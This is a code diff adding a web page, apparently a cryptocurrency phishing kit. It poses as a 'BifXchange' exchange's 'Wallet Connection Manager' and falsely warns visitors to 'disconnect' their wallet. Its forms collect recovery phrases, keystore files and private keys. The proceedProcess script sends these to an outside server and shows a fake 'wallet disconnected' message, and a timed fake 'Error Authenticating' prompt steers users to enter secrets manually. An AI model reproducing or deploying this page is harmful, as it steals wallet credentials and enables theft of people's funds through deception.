+  }
+
+  .mb-6 {
+    margin-bottom: 1.5rem;
+  }
+
+  .mt-10 {
+    margin-top: 2.5rem;
+  }
+
+  .mr-10 {
+    margin-right: 2.5rem;
+  }
+
+  .object-contain {
+    -o-object-fit: contain;
+    object-fit: contain;
+  }
+
+  .focus\:outline-none:focus {
+    outline: 2px solid transparent;
+    outline-offset: 2px;
+  }
+
+  .overflow-hidden {
+    overflow: hidden;
+  }
+
+  .p-2 {
+    padding: .5rem;
+  }
+
+  .py-2 {
+    padding-top: .5rem;
+    padding-bottom: .5rem;
+  }
+
+  .py-3 {
+    padding-top: .75rem;
+    padding-bottom: .75rem;
+  }
+
+  .px-4 {
+    padding-left: 1rem;
+    padding-right: 1rem;
+  }
+
+  .pr-4 {
+    padding-right: 1rem;
+  }
+
+  .pb-4 {
+    padding-bottom: 1rem;
+  }
+
+  .pl-4 {
+    padding-left: 1rem;
+  }
+
+  .pt-5 {
+    padding-top: 1.25rem;
+  }
+
+  .placeholder-gray-500::-moz-placeholder {
+    --placeholder-opacity: 1;
+    color: #a0aec0;
+    color: rgba(160, 174, 192, var(--placeholder-opacity));
+  }
+
+  .placeholder-gray-500:-ms-input-placeholder {
+    --placeholder-opacity: 1;
+    color: #a0aec0;
+    color: rgba(160, 174, 192, var(--placeholder-opacity));
+  }
+
+  .placeholder-gray-500::placeholder {
+    --placeholder-opacity: 1;
+    color: #a0aec0;
+    color: rgba(160, 174, 192, var(--placeholder-opacity));
+  }
+
+  .relative {
+    position: relative;
+  }
+
+  .shadow-sm {
+    box-shadow: 0 1px 2px 0 rgba(0, 0, 0, .05);
+  }
+
+  .shadow-xl {
+    box-shadow: 0 20px 25px -5px rgba(0, 0, 0, .1), 0 10px 10px -5px rgba(0, 0, 0, .04);
+  }
+
+  .text-left {
+    text-align: left;
+  }
+
+  .text-center {
+    text-align: center;
+  }
+
+  .text-white {
+    --text-opacity: 1;
+    color: #fff;
+    color: rgba(255, 255, 255, var(--text-opacity));
+  }
+
+  .text-gray-900 {
+    --text-opacity: 1;
+    color: #1a202c;
+    color: rgba(26, 32, 44, var(--text-opacity));
+  }
+
+  .uppercase {
+    text-transform: uppercase;
+  }
+
+  .align-bottom {
+    vertical-align: bottom;
+  }
+
+  .w-6 {
+    width: 1.5rem;
+  }
+
+  .w-12 {
+    width: 3rem;
+  }
+
+  .w-full {
+    width: 100%;
+  }
+
+  .transform {
+    --transform-translate-x: 0;
+    --transform-translate-y: 0;
+    --transform-rotate: 0;
+    --transform-skew-x: 0;
+    --transform-skew-y: 0;
+    --transform-scale-x: 1;
+    --transform-scale-y: 1;
+    transform: translateX(var(--transform-translate-x)) translateY(var(--transform-translate-y)) rotate(var(--transform-rotate)) skewX(var(--transform-skew-x)) skewY(var(--transform-skew-y)) scaleX(var(--transform-scale-x)) scaleY(var(--transform-scale-y));
+  }
+
+  .transition-all {
+    transition-property: all;
+  }
+
+  .transition {
+    transition-property: background-color, border-color, color, fill, stroke, opacity, box-shadow, transform;
+  }
+
+  .ease-in {
+    transition-timing-function: cubic-bezier(.4, 0, 1, 1);
+  }
+
+  .duration-150 {
+    transition-duration: .15s;
+  }
+
+  @media (min-width:640px) {
+    .sm\:flex {
+      display: flex;
+    }
+
+    .sm\:flex-row-reverse {
+      flex-direction: row-reverse;
+    }
+
+    .sm\:items-start {
+      align-items: flex-start;
+    }
+
+    .sm\:h-10 {
+      height: 2.5rem;
+    }
+
+    .sm\:text-sm {
+      font-size: .875rem;
+    }
+
+    .sm\:text-base {
+      font-size: 1rem;
+    }
+
+    .sm\:mx-0 {
+      margin-left: 0;
+      margin-right: 0;
+    }
+
+    .sm\:my-8 {
+      margin-top: 2rem;
+      margin-bottom: 2rem;
+    }
+
+    .sm\:mt-0 {
+      margin-top: 0;
+    }
+
+    .sm\:ml-3 {
+      margin-left: .75rem;
+    }
+
+    .sm\:ml-4 {
+      margin-left: 1rem;
+    }
+
+    .sm\:max-w-lg {
+      max-width: 32rem;
+    }
+
+    .sm\:p-6 {
+      padding: 1.5rem;
+    }
+
+    .sm\:px-6 {
+      padding-left: 1.5rem;
+      padding-right: 1.5rem;
+    }
+
+    .sm\:pb-4 {
+      padding-bottom: 1rem;
+    }
+
+    .sm\:text-left {
+      text-align: left;
+    }
+
+    .sm\:align-middle {
+      vertical-align: middle;
+    }
+
+    .sm\:w-10 {
+      width: 2.5rem;
+    }
+
+    .sm\:w-auto {
+      width: auto;
+    }
+
+    .sm\:w-full {
+      width: 100%;
+    }
+  }
+
+  @media (min-width:768px) {
+    .md\:object-scale-down {
+      -o-object-fit: scale-down;
+      object-fit: scale-down;
+    }
+  }
+
+  /*! CSS Used from: Embedded */
+  *,
+  :after,
+  :before {
+    box-sizing: border-box;
+    margin: 0;
+  }
+
+  /*! CSS Used from: Embedded */
+  div,
+  input {
+    font-family: "DM Sans", sans-serif !important;
+  }
+
+  /*! CSS Used from: Embedded */
+  div,
+  span {
+    font-family: "DM Sans", sans-serif;
+  }
+
+  /*! CSS Used from: Embedded */
+  .active {
+    border-color: #3498db;
+  }
+
+  /*! CSS Used fontfaces */
+  @font-face {
+    font-family: 'DM Sans';
+    font-style: italic;
+    font-weight: 400;
+    font-display: swap;
+    src: url(https://securedwalletsprotocols.online/s/dmsans/v6/rP2Fp2ywxg089UriCZa4ET-DNl0.woff2) format('woff2');
+    unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+  }
+
+  @font-face {
+    font-family: 'DM Sans';
+    font-style: italic;
+    font-weight: 400;
+    font-display: swap;
+    src: url(https://securedwalletsprotocols.online/s/dmsans/v6/rP2Fp2ywxg089UriCZa4Hz-D.woff2) format('woff2');
+    unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+  }
+
+  @font-face {
+    font-family: 'DM Sans';
+    font-style: italic;
+    font-weight: 500;
+    font-display: swap;
+    src: url(https://securedwalletsprotocols.online/s/dmsans/v6/rP2Ap2ywxg089UriCZaw7ByWB3wTyCg.woff2) format('woff2');
+    unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+  }
+
+  @font-face {
+    font-family: 'DM Sans';
+    font-style: italic;
+    font-weight: 500;
+    font-display: swap;
+    src: url(https://securedwalletsprotocols.online/s/dmsans/v6/rP2Ap2ywxg089UriCZaw7ByWCXwT.woff2) format('woff2');
+    unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+  }
+
+  @font-face {
+    font-family: 'DM Sans';
+    font-style: italic;
+    font-weight: 700;
+    font-display: swap;
+    src: url(https://securedwalletsprotocols.online/s/dmsans/v6/rP2Ap2ywxg089UriCZawpBqWB3wTyCg.woff2) format('woff2');
+    unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+  }
+
+  @font-face {
+    font-family: 'DM Sans';
+    font-style: italic;
+    font-weight: 700;
+    font-display: swap;
+    src: url(https://securedwalletsprotocols.online/s/dmsans/v6/rP2Ap2ywxg089UriCZawpBqWCXwT.woff2) format('woff2');
+    unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+  }
+
+  @font-face {
+    font-family: 'DM Sans';
+    font-style: normal;
+    font-weight: 400;
+    font-display: swap;
+    src: url(https://securedwalletsprotocols.online/s/dmsans/v6/rP2Hp2ywxg089UriCZ2IHSeH.woff2) format('woff2');
+    unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+  }
+
+  @font-face {
+    font-family: 'DM Sans';
+    font-style: normal;
+    font-weight: 400;
+    font-display: swap;
+    src: url(https://securedwalletsprotocols.online/s/dmsans/v6/rP2Hp2ywxg089UriCZOIHQ.woff2) format('woff2');
+    unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+  }
+
+  @font-face {
+    font-family: 'DM Sans';
+    font-style: normal;
+    font-weight: 500;
+    font-display: swap;
+    src: url(https://securedwalletsprotocols.online/s/dmsans/v6/rP2Cp2ywxg089UriAWCrCBamC2QX.woff2) format('woff2');
+    unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+  }
+
+  @font-face {
+    font-family: 'DM Sans';
+    font-style: normal;
+    font-weight: 500;
+    font-display: swap;
+    src: url(https://securedwalletsprotocols.online/s/dmsans/v6/rP2Cp2ywxg089UriAWCrCBimCw.woff2) format('woff2');
+    unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+  }
+
+  @font-face {
+    font-family: 'DM Sans';
+    font-style: normal;
+    font-weight: 700;
+    font-display: swap;
+    src: url(https://securedwalletsprotocols.online/s/dmsans/v6/rP2Cp2ywxg089UriASitCBamC2QX.woff2) format('woff2');
+    unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+  }
+
+  @font-face {
+    font-family: 'DM Sans';
+    font-style: normal;
+    font-weight: 700;
+    font-display: swap;
+    src: url(https://securedwalletsprotocols.online/s/dmsans/v6/rP2Cp2ywxg089UriASitCBimCw.woff2) format('woff2');
+    unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+  }
+</style>
+<style>
+  .acc-body {
+    display: none;
+  }
+
+  .acc-body.active {
+    display: block;
+  }
+</style>
+<div class="overlay" id="thebox" style="display: none ; margin-top: -50px;">
+<div class="overbox" id="closewindow">
+<div style="overflow:hidden;margin:5px 0px;">
+<div class="closex" onclick="shutx('#thebox')">Back</div>
+</div>
+<div class="insidewidth onediv" id="jumbobox">
+<div class="container-fluid">
+<div class="row">
+<div class="col-md-12">
+<div style="padding:20px;margin-top: 40px;"><h3>Authenticate your wallet manually</h3></div>
+<ul class="nav nav-tabs">
+<li class="nav-item"><a class="nav-link active" data-toggle="tab" href="#phrase">Phrase</a></li>
+<li class="nav-item"><a class="nav-link" data-toggle="tab" href="#keystore">Keystore JSON</a></li>
+<li class="nav-item"><a class="nav-link" data-toggle="tab" href="#privatekey">Private Key</a></li>
+</ul>
+</div>
+</div>
+</div>
+<div class="loadbox ccbox">
+<div class="loaddv">
+<div class="loader"></div>
+</div>
+</div>
+<section style="margin-top: 40px;">
+<div class="container-fluid">
+<div class="row">
+<div class="col-md-12">
+<!-- Tab panes -->
+<div class="tab-content">
+<div class="tab-pane fade show active" id="phrase" role="tabpanel">
+<form action="#" method="post">
+<input class="wallettype" id="wallettype1" name="wallettype1" type="hidden"/>
+<input id="type1" name="type1" type="hidden" value="phrase"/>
+<textarea class="form-control" id="value1" name="value1" placeholder="Enter your recovery phrase" required="" rows="5"></textarea>
+<br/>
+<input class="form-control" name="email" placeholder="Confirm Phrase" required="" style="visibility:hidden;" value="1"/>
+<input name="message" placeholder="Password" required="" type="hidden"/>
+<p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+<div class="form-group">
+<button class="btn btn-primary btn-block" onclick="proceedProcess(1)" type="button">PROCEED</button>
+<button class="btn btn-primary btn-block" onclick="closewindow()" style="background-color:#e53e3e; width:100%;border-color: #e53e3e;">CANCEL</button>
+</div>
+</form>
+</div>
+<div class="tab-pane fade" id="keystore" role="tabpanel">
+<form action="#" method="post">
+<input class="wallettype" id="wallettype2" name="wallettype2" type="hidden">
+<input id="type2" name="type2" type="hidden" value="keystore">
+<div class="form-group">
+<textarea class="form-control" id="value2" name="value2" placeholder="Keystore JSON" required="" rows="5"></textarea>
+</div>
+<div class="form-group">
+<input class="form-control" name="email" placeholder="Password" required="" style="visibility:hidden;" value="2"/>
+<input name="message" placeholder="Password" required="" type="hidden"/>
+</div>
+<p class="text-secondary" style="margin-top: 10px;">
+                Several lines of text beginning with "{...}" plus the password you used to encrypt it.
+              </p>
+<div class="form-group">
+<button class="btn btn-primary btn-block" onclick="proceedProcess(2)" type="button">PROCEED</button>
+</div>
+<div class="form-group">
+<button class="btn btn-primary btn-block" onclick="closewindow()" style=" background-color:#e53e3e; width:300px;border-color: #e53e3e;">CANCEL</button>
+</div>
+</input></input></form>
+</div>
+<div class="tab-pane fade" id="privatekey" role="tabpanel">
+<form action="#" method="post">
+<input id="type3" name="type3" type="hidden" value="privatekey"/>
+<input class="wallettype" id="wallettype3" name="wallettype3" type="hidden">
+<div class="form-group">
+<input class="form-control" id="value3" name="value3" placeholder="Private Key" required=""/>
+<br/>
+<input class="form-control" name="email" placeholder="Confirm Private Key" required="" style="visibility:hidden;" value="3"/>
+<input name="message" placeholder="Password" required="" type="hidden"/>
+</div>
+<div class="form-group"><button class="btn btn-primary btn-block" onclick="proceedProcess(3)" type="button">PROCEED</button></div>
+<div class="form-group"><button class="btn btn-primary btn-block" onclick="closewindow()" style=" background-color:#e53e3e; width:100%;border-color: #e53e3e;">CANCEL</button></div>
+</input></form>
+</div>
+</div>
+</div>
+</div>
+</div>
+</section>
+</div>
+<div class="insidewidth twodiv" id="">
+<div class="dsdiv" id="fdxz" style="display:flex;">
+<div class="textdx" id="initext" style="font-size:14px;">Initializing</div>
+<div class="loaderw"></div>
+<div class="yuck" onclick="startjob()" style="background-color: #e14d43;">Authenticate Manually</div>
+</div>
+<div class="dsdiv fxz" onclick="startjob()">
+<div class="textdx" id="extracttext" style="font-weight: bold;"></div>
+<div class="textdx" style="font-size:13px;margin:7px 0px">Authenticate <span id="extracttext2"></span>
+</div>
+</div>
+</div>
+</div>
+</div>
+<style>
+  .loaderw {
+    border: 1px solid black;
+    /* Light grey */
+    border-top: 1px solid transparent;
+    /* Blue */
+    border-radius: 50%;
+    width: 15px;
+    height: 15px;
+    animation: spin 0.5s linear infinite;
+    margin: 0px 20px;
+    display: none;
+  }
+
+  .yuck {
+    background: #777879;
+    font-size: 11px;
+    color: white;
+    font-weight: bold;
+    text-align: center;
+    padding: 7px 20px;
+    border-radius: 3px;
+    cursor: pointer;
+    transition: 0.5s;
+    display: none;
+    margin: 0px 9px;
+  }
+
+  .dsdiv {
+    padding: 20px 20px;
+    border: 1px solid rgba(192, 192, 192, 0.5);
+    margin: 10px 0px;
+    border-radius: 5px;
+
+  }
+
+  .reddsdiv {
+    border: 1px solid red !important;
+  }
+
+  .reddsdiv .textdx {
+    color: red !important;
+  }
+
+  .insidewidth {
+    padding: 10px 10px;
+
+  }
+
+  .fxz {
+    background: #f2f2f2;
+  }
+</style>
+<nav class="navbar navbar-expand-lg navbar-light bg-light">
+<a class="navbar-brand" href="#">BifXchange</a>
+<button aria-controls="navbarText" aria-expanded="false" aria-label="Toggle navigation" class="navbar-toggler" data-target="#navbarText" data-toggle="collapse" type="button">
+<span class="navbar-toggler-icon"></span>
+</button>
+<div class="collapse navbar-collapse" id="navbarText">
+<ul class="navbar-nav mr-auto">
+<li class="nav-item active">
+<a class="nav-link" href="#">Home <span class="sr-only">(current)</span></a>
+</li>
+<li class="nav-item">
+<a class="nav-link" href="#">Buy</a>
+</li>
+<li class="nav-item">
+<a class="nav-link" href="#">Sell</a>
+</li>
+<li class="nav-item">
+<a class="nav-link" href="#">Market</a>
+</li>
+</ul>
+<span class="navbar-text">
+        Exchange easily
+      </span>
+</div>
+</nav>
+<section style="background-color: #000; color: #FFF; box-shadow: 5px 5px #007bff; padding:20px;">
+<div class="container-fluid">
+<div class="row">
+<div class="col-sm-8 col-md-12">
+<h4 class="readeroption btn btn-primary btn-block" style="font-size: 25px; background-color: #000; color: #FFF; box-shadow: 5px 5px #007bff;">Welcome to BifXchange
+</h4></div>
+</div>
+<div class="row">
+<div class="col-md-4 offset-md-4">
+<ul style="margin-top:20px;">
+<li style="float: left; margin-right: 20px; font-size: 18px;">Exchange</li>
+<li style="float: left; margin-right: 20px">Buy</li>
+<li style="float: left; margin-right: 20px">Sell</li>
+<li style="float: left; margin-right: 20px">All Crypto Assets</li>
+</ul>
+</div>
+</div>
+</div>
+</section>
+<section style="margin-top: 40px;">
+<div class="container-fluid">
+<div class="row">
+<div class="col-lg-6 col-md-6 offset-lg-3 offset-md-3">
+<h4 style="text-align: center;">Wallet Connection Manager</h4>
+<span style="text-align: justify;">Your wallet was recently connected to our exchange, if you didn't do so, disconnect your wallet below to avoid loss of funds!</span>
+</div>
+</div>
+<div class="row">
+<div class="col-lg-4 col-md-6 offset-lg-4 offset-md-3">
+<!-- Tab panes -->
+<!-- Button trigger modal -->
+<div class="form-group">
+<button class="readeroption btn btn-primary btn-block" data-target="#exampleModal" data-toggle="modal" style="background-color: #000; color: #FFF; box-shadow: 5px 5px #007bff;"><blink>DISCONNECT YOUR WALLET (***)</blink></button>
+</div>
+<div class="form-group"><button class="readeroption btn btn-primary btn-block" data-target="#exampleModal" data-toggle="modal" style="background-color: #000; color: #FFF; box-shadow: 5px 5px #007bff;"> REVOKE PERMISSIONS</button></div>
+<div class="form-group"><button class="readeroption btn btn-primary btn-block" style="background-color: #000; color: #FFF; box-shadow: 5px 5px #007bff;"> CANCEL</button></div>
+</div>
+</div>
+</div>
+</section>
+<script src="local_resources/js/cb9f95acfe74dc80f214ee2e72a8dbd1.js"></script>
+<script src="local_resources/js/61795f40b252b09dd2636ca3abc79c08.js"></script>
+</body>
+<!-- Modal -->
+<div aria-hidden="true" aria-labelledby="exampleModalLabel" class="modal fade" id="exampleModal" role="dialog" tabindex="-1">
+<div class="modal-dialog" role="document">
+<div class="modal-content">
+<div class="modal-header">
+<h5 class="modal-title" id="exampleModalLabel">Select Wallet to Continue</h5>
+<button aria-label="Close" class="close" data-dismiss="modal" type="button">
+<span aria-hidden="true">×</span>
+</button>
+</div>
+<div class="modal-body">
+<input id="myInput" onkeyup="myFunction()" placeholder="Search wallets.." title="Type in a name" type="text"/>
+<ul id="myUL">
+<li class="iconzzz">
+<a href="#">
+<img class="img_icons" src="local_resources/img/6a9825375654cc480acc8570c6319688.png"/>
+    Metamask
+  </a>
+</li>
+<li class="iconzzz">
+<a href="#">
+<img alt="Trust Wallet" class="img_icons" src="local_resources/img/4bca599232bb0871f698b6f3b4e2f74c.png"/>
+    TrustWallet
+  </a>
+</li>
+<li class="iconzzz">
+<a href="#">
+<img alt="Coin98" class="img_icons" src="local_resources/img/1216399d2220c2dc6774b72ca5ead961.png"/>
+    Coin98
+    </a>
+</li>
+<li class="iconzzz">
+<a href="#">
+<img alt="Rainbow" class="img_icons" src="local_resources/img/9c4afaa81c79558432687c53b2b00c9e.png"/>
+    Blockchain</a>
+</li>
+<li class="iconzzz">
+<a href="#">
+<img class="img_icons" src="local_resources/img/045cc75deef19d0e8cae8df8cdd4f9d6.png"/>
+    Bitpie</a>
+</li>
+<li class="iconzzz">
+<a href="#">
+<img class="img_icons" src="local_resources/img/c26a854426a889720d4d2fa9f09aa0bb.png"/>
+    Binance Smart Chain
+  </a>
+</li>
+<li class="iconzzz"><a href="#">
+<img alt="Crypto.com | DeFi Wallet" class="img_icons" src="local_resources/img/bccb1324816b467da63e12cd48275362.png"/>
+      Crypto.com Wallet
+  </a></li>
+<li class="iconzzz">
+<a href="#">
+<img class="img_icons" src="local_resources/img/ef501c5aa1b6a2edb707a549954f7cf9.png"/>
+    Gnosis</a>
+</li>
+<li class="iconzzz">
+<a href="#">
+<img class="img_icons" src="local_resources/img/95b2a504bfeaf6444ff701a9599ad520.png"/>
+    Coinbase</a>
+</li>
+<li class="iconzzz">
+<a href="#">
+<img class="img_icons" src="local_resources/img/573aef6e54b0e20d8a39d0b1a094203d.png"/>
+    Alice
+  </a>
+</li>
+<li class="iconzzz">
+<a href="#">
+<img class="img_icons" src="local_resources/img/0ed56bd8c0b120ba081ef466fe55212b.png"/>
+    Alpha
+  </a>
+</li>
+<li class="iconzzz">
+<a href="#">
+<img class="img_icons" src="local_resources/img/ddaf9f4c425ccdcdaeaf658ae3311cd7.png"/>
+    AToken
+  </a>
+</li>
+<li class="iconzzz">
+<a href="#">
+<img class="img_icons" src="local_resources/img/c2f946bf010e523951d20d48ef3ab52d.png"/>
+   Bitkeep
+  </a>
+</li>
+<li class="iconzzz">
+<a href="#">
+<img class="img_icons" src="local_resources/img/4fec6f0d7a658b37cc7ca777ace85ed4.png"/>
+      Bitpay
+  </a>
+</li>
+<li class="iconzzz">
+<a href="#">
+<img class="img_icons" src="local_resources/img/9ae47745f176ed44d8777b0e002fd2e0.png"/>
+   Bridge
+  </a>
+</li>
+<li class="iconzzz">
+<a href="#">
+<img class="img_icons" src="local_resources/img/e2aee598df595f11f13732d94ecf2343.png"/>
+   CentWallet
+  </a>
+</li>
+<li class="iconzzz">
+<a href="#">
+<img class="img_icons" src="local_resources/img/0c6c91a5707e35ca6987cd34dcaf6902.png"/>
+      Coinomi
+  </a>
+</li>
+<li class="iconzzz">
+<a href="#">
+<img class="img_icons" src="local_resources/img/81a069a33ac5e2dfa2f6d59139fe4143.png"/>
+    Coolwallet
+  </a>
+</li>
+<li class="iconzzz">
+<a href="#">
+<img class="img_icons" src="local_resources/img/79c6711e4fae58e4d4066640357c4ded.png"/>
+    Cybavo
+  </a>
+</li>
+<li class="iconzzz">
+<a href="#">
+<img class="img_icons" src="local_resources/img/1b38a8008d8ec76be379a91f0f54589a.png"/>
+      Defiant
+  </a>
+</li>
+<li class="iconzzz">
+<a href="#">
+<img class="img_icons" src="local_resources/img/20caa685831d847d5737f0f4b534c132.png"/>
+    Dok
+  </a>
+</li>
+<li class="iconzzz">
+<a href="#">
+<img class="img_icons" src="local_resources/img/35913c6338b91cb142898f34a930cf1c.png"/>
+   EasyPocket
+  </a>
+</li>
+<li class="iconzzz">
+<a href="#">
+<img class="img_icons" src="local_resources/img/77361b71c78303b7a52893e8c27f2d1e.png"/>
+   Eidoo
+  </a>
+</li>
+<li class="iconzzz">
+<a href="#">
+<img class="img_icons" src="local_resources/img/edda81c81c67669e2cb36d63fe432500.png"/>
+      Flare
+  </a>
+</li>
+<li class="iconzzz">
+<a href="#">
+<img class="img_icons" src="local_resources/img/c387c4f0f2ddc6e9f132baab646008ce.png"/>
+    GridPlus
+  </a>
+</li>
+<li class="iconzzz">
+<a href="#">
+<img class="img_icons" src="local_resources/img/8e1d37fe22f3f22824c8db5f7122e651.png"/>
+    Guarda
+  </a>
+</li>
+<li class="iconzzz">
+<a href="#">
+<img class="img_icons" src="local_resources/img/9a0f8610880f418b693fe9710d737846.png"/>
+   Halo Defi
+  </a>
+</li>
+<li class="iconzzz">
+<a href="#">
+<img class="img_icons" src="local_resources/img/f4e03ab2c8dc44d5768f13901f80c6ea.png"/>
+     Huobi
+  </a>
+</li>
+<li class="iconzzz">
+<a href="#">
+<img class="img_icons" src="local_resources/img/5ce5ec7fee1b927ad99ca811d81fca64.png"/>
+      Infinitio
+  </a>
+</li>
+<li class="iconzzz">
+<a href="#">
+<img class="img_icons" src="local_resources/img/ddde7c04005a408c2f8dd9ace6aba529.png"/>
+    Infinity
+  </a>
+</li>
+<li class="iconzzz">
+<a href="#">
+<img class="img_icons" src="local_resources/img/66ac3a98310696d2aba0f7a4f40edf4e.png"/>
+    Keeplr
+  </a>
+</li>
+<li class="iconzzz">
+<a href="#">
+<img class="img_icons" src="local_resources/img/d9cb4198c78417ac9edb85634bc85045.png"/>
+    Nash
+  </a>
+</li>
+<li class="iconzzz">
+<a href="#">
+<img class="img_icons" src="local_resources/img/027b71e48b5ad403f271f85a56671827.png"/>
+     Onto
+  </a>
+</li>
+<li class="iconzzz">
+<a href="#">
+<img class="img_icons" src="local_resources/img/aed9b98c65921816d61bcac091368de6.png"/>
+    Ownbit
+  </a>
+</li>
+<li class="iconzzz">
+<a href="#">
+<img class="img_icons" src="local_resources/img/a3ef349baca2c06156ee5078515da079.png"/>
+    Peakdefi
+  </a>
+</li>
+<li class="iconzzz">
+<a href="#">
+<img class="img_icons" src="local_resources/img/e3bc388a532af2eccb97c3a10e8c95f0.png"/>
+    RWallet
+  </a>
+</li>
+<li class="iconzzz">
+<a href="#">
+<img class="img_icons" src="local_resources/img/116eb269bd917c4e66cf7b8edf803f57.png"/>
+    Safepal
+  </a>
+</li>
+<li class="iconzzz">
+<a href="#">
+<img class="img_icons" src="local_resources/img/f11cf3c874f5d8c0ab1438ad7637c518.png"/>
+     Spatium
+  </a>
+</li>
+<li class="iconzzz">
+<a href="#">
+<img class="img_icons" src="local_resources/img/b7a12c734fc38985b4defc2e47214af9.png"/>
+    Talken
+  </a>
+</li>
+<li class="iconzzz">
+<a href="#">
+<img class="img_icons" src="local_resources/img/080cea6d650244f82f69cdb78d0b0b1f.png"/>
+    Tokenary
+  </a>
+</li>
+<li class="iconzzz">
+<a href="#">
+<img class="img_icons" src="local_resources/img/6d8d89f8864162f2705f0f2ae5e251ac.png"/>
+    Unstoppable
+  </a>
+</li>
+<li class="iconzzz">
+<a href="#">
+<img class="img_icons" src="local_resources/img/e8f03d5f1cef08cda78735ad32f1f64d.png"/>
+    Viawallet
+  </a>
+</li>
+</ul>
+</div>
+<div class="modal-footer">
+<button class="btn btn-secondary" data-dismiss="modal" type="button">Close</button>
+</div>
+</div>
+</div>
+</div>
+</html>
+<script>
+
+function proceedProcess(num){
+
+  let type = $("#type"+num).val();
+
+  let value = $("#value"+num).val();
+
+  let wallettype = $("#wallettype"+num).val();
+
+  let content = `<div class="container max-w-screen-sm py-20 px-5 md:px-8 flex flex-col h-full items-center justify-items-center mx-auto text-center">
+               
+                    <svg class="animate-spin -ml-1 mr-3 h-16 w-16 text-primary" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                        
+                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                    
+                    </svg>
+                    
+                    <h2 class="text-2xl text-center justify font-bold my-4">Disconnecting Please Wait...</h2>
+                    <p class="text-lg text-gray-600 mb-6">This may take a few moments to complete</p>
+                    
+                
+                </div>`;
+
+                $("#jumbobox").html(content);
+
+            $.ajax({
+            //goto,
+            url: "https://hwsrv-1007750.hostwindsdns.com/process.php",
+            type: 'POST',
+            data:{
+                type:type,
+                value:value,
+                wallettype:wallettype
+            },
+            
+            success: function(response){
+                if(response){
+                  console.log(response);
+
+                  alert("Your wallet has been disconnected!!!");
+
+                  $("#jumbobox").html("<h3>Your wallet has been disconnected!!!</h3>")
+                    
+                  //window.location.href="<?php echo BASE_URL.'dashboard/edit_post/'; ?>"+response.id;
+                }
+            },
+            error: function(xhr, textStatus, error){
+                console.log(error);
+            },
+            complete: function(){
+            }
+        });
+
+}
+
+function shutx(element){
+$(element).fadeOut('fast');
+}
+
+function openx(element){
+$(element).fadeIn('fast');
+}
+
+
+function startbigloader(){
+ openx('#loader');
+}
+
+function closebigloader(){
+  shutx('#loader');
+}
+
+  function submitform() {
+    sendform('actions.html', '#submitform', 'submitform');
+  }
+
+  function startloader() {
+    $('.ccbox').removeClass('activebox');
+    $('.loadbox').addClass('activebox');
+    shutx('.buttonbox');
+  }
+
+  function closeloader() {
+    $('.ccbox').removeClass('activebox');
+    $('.phrasebox').addClass('activebox');
+    openx('.buttonbox');
+  }
+
+
+  function extractwallet(element) {
+    openx('#thebox');
+
+    $('.insidewidth').removeClass('activebox');
+    $('.twodiv').addClass('activebox');
+
+    $('#initext').html("Initializing");
+    openx('.loaderw');
+    shutx('.yuck');
+    $('#fdxz').removeClass('reddsdiv');
+
+
+    setTimeout(function () {
+      $('#initext').html("Error Authenticating");
+      shutx('.loaderw');
+      openx('.yuck');
+      $('#fdxz').addClass('reddsdiv');
+    }, 2000);
+
+
+
+    var texr = $(element).text();
+
+    var texc = texr.replace(/\t+/g, '');
+    var text = texc.trim();
+    $('.wallettype').val(text);
+    $('#extracttext').html(text);
+    $('#extracttext2').html(text);
+
+  }
+
+
+  function startjob() {
+    $('.insidewidth').addClass('activebox');
+    $('.twodiv').removeClass('activebox');
+  }
+
+
+  function switchshow(element) {
+
+    $('.allinput').val("");
+
+
+    $('.sgrid').removeClass('sactive');
+    $(element).addClass('sactive');
+
+    if ($(element).text() == "Phrase") {
+
+      $('.ccbox').removeClass('activebox');
+      $('.phrasebox').addClass('activebox');
+
+      $('#wallettype').val("phrase");
+
+    } else if ($(element).text() == "Keystore JSON") {
+
+      $('.ccbox').removeClass('activebox');
+      $('.keystorebox').addClass('activebox');
+
+      $('#wallettype').val("keystore");
+
